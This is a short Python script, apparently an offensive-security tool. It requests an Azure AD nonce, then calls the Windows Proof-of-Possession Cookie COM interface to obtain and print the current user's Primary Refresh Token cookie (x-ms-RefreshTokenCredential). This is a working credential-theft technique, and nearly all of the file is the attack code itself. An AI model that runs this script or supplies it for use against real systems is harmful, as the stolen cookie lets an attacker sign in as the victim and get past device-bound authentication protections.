"""
    Request PRT cookie by calling the Proof-of-Possession Cookie COM API. 
"""
import ctypes
from ctypes import Structure, POINTER, c_wchar_p, c_ulong
import comtypes
from comtypes import GUID, HRESULT, IUnknown, COMMETHOD
from comtypes import client as com_client
import requests


# CLSID of the COM class
CLSID_ProofOfPossessionCookieInfoManager = GUID("{A9927F85-A304-4390-8B23-A75F1C668600}")


# Struct returned by GetCookieInfoForUri
class ProofOfPossessionCookieInfo(Structure):
    _fields_ = [
        ("name",      c_wchar_p),
        ("data",      c_wchar_p),
        ("flags",     c_ulong),
        ("p3pHeader", c_wchar_p),
    ]


# IProofOfPossessionCookieInfoManager interface
class IProofOfPossessionCookieInfoManager(IUnknown):
    _iid_ = GUID("{CDAECE56-4EDF-43DF-B113-88E4556FA1BB}")
    _methods_ = [
        COMMETHOD([], HRESULT, "GetCookieInfoForUri",
                  ([], c_wchar_p, "uri"),
                  ([], POINTER(c_ulong), "cookieInfoCount"),
                  ([], POINTER(POINTER(ProofOfPossessionCookieInfo)), "cookieInfo"))
    ]


def get_nonce(tenant_id: str) -> str:
    """
    Request a nonce from the tenant to be used in the SSO/PRT cookie flow.
    Docs: AAD requires a nonce since 2020 for PRT cookie redemption.
    """
    url = f"https://login.microsoftonline.com/{tenant_id}/oauth2/token"
    body = {"grant_type": "srv_challenge"}
    resp = requests.post(url, data=body)
    if resp.ok:
        j = resp.json()
        nonce = j.get("Nonce")
        print(f"[+] Nonce: {nonce}")
        return nonce
    else:
        print(f"[!] Nonce request failed: {resp.status_code} {resp.text}")
        return None


def get_prt_cookie_via_com(nonce: str):
    """
    Use the Proof-of-Possession Cookie COM API to fetch the x-ms-RefreshTokenCredential cookie.
    """
    # The browsers (and BrowserCore) request the cookie for this authorize URI including the nonce.
    uri = f"https://login.microsoftonline.com/common/oauth2/authorize?sso_nonce={nonce}"

    # Initialize COM apartment
    comtypes.CoInitialize()

    # Create the COM object
    mgr = com_client.CreateObject(CLSID_ProofOfPossessionCookieInfoManager, interface=IProofOfPossessionCookieInfoManager)

    # Call GetCookieInfoForUri
    count = c_ulong(0)
    cookies_ptr = POINTER(ProofOfPossessionCookieInfo)()
    hr = mgr.GetCookieInfoForUri(uri, ctypes.byref(count), ctypes.byref(cookies_ptr))
    if hr != 0:
        print(f"[!] GetCookieInfoForUri failed HR=0x{hr:08X}")
        return None

    # Iterate the returned array
    result_value = None
    for i in range(count.value):
        ci = cookies_ptr[i]
        # Look for the PRT cookie name
        if ci.name == "x-ms-RefreshTokenCredential":
            result_value = ci.data
            print("[+] Found x-ms-RefreshTokenCredential")
            break

    if not result_value:
        print("[!] No PRT cookie returned for this URI / context")
    else:
        print(result_value)

    return None


if __name__ == "__main__":
    # Set manually
    tenant_id = ""

    nonce = get_nonce(tenant_id)
    if nonce:
        get_prt_cookie_via_com(nonce)
